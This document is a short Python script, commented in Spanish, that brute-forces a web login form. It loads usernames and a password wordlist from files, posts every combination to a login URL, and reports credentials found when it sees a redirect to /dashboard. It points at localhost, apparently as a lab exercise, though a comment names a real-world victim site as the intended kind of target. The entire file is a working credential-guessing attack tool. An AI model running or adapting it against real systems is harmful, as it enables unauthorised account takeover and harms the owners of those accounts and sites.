import requests

# URL del objetivo — en la vida real sería https://victima.com/login
url = "http://127.0.0.1:5000/"

# Leer usuarios desde archivo externo
with open("usuarios.txt", "r") as f:
    usuarios = [line.strip() for line in f if line.strip()]

# Leer contraseñas desde archivo externo
with open("wordlist.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"🔍 Objetivo: {url}")
print(f"👥 Usuarios cargados: {len(usuarios)}")
print(f"🔑 Contraseñas cargadas: {len(passwords)}")
print(f"📊 Total de intentos: {len(usuarios) * len(passwords)}\n")

encontrado = False

for username in usuarios:
    for password in passwords:
        response = requests.post(url, data={
            "username": username,
            "password": password
        }, allow_redirects=False)

        if response.status_code == 302 and "/dashboard" in response.headers.get("Location", ""):
            print(f"\n{'='*40}")
            print(f"✅ CREDENCIALES ENCONTRADAS")
            print(f"   Usuario:    {username}")
            print(f"   Contraseña: {password}")
            print(f"{'='*40}\n")
            encontrado = True
            break
        else:
            print(f"❌ Probando {username}:{password}")

    if encontrado:
        break

if not encontrado:
    print("\n⛔ No se encontraron credenciales válidas")